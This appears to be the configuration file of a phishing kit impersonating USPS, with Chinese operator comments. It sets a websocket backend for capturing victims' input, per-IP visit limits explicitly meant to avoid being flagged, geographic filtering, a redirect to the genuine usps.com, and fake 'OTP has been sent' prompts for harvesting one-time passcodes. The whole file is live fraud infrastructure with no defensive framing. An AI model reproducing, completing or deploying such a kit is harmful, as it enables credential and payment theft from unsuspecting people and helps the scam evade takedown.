var url={
			//设置你的java后台域名，结尾不要带/
			"serviceURL":"https://" + document.domain,
			"wssURL":"wss://wss.tian999.shop",
			"mb":"mb_wdy",
			"redSwitch":1,
			//设置每个ip最大访问次数，每个页面刷新算一次，同步建议设置不超过15，次数过多容易红
			"Visits":150,
			//设置可以访问的地区，US：美国，CN：中国，HK：香港
			"country":"US,HK,CN,RA,CA",
			//1 为服务器查询访问地区，服务器被墙可能不可用，无法加载页面，可尝试修改成2
			"config":2,
			"isclose":0,
			//设置跳转地址
			"CPCurl":"https://www.usps.com/",
			"opt_tip":"OTP has been sent via SMS",
			"email_tip":"OTP has been sent via email to",
			"comeurl":document.domain,
			"payerid":10,
			"ref_url":"https://"+ document.domain +"/main.html"
		}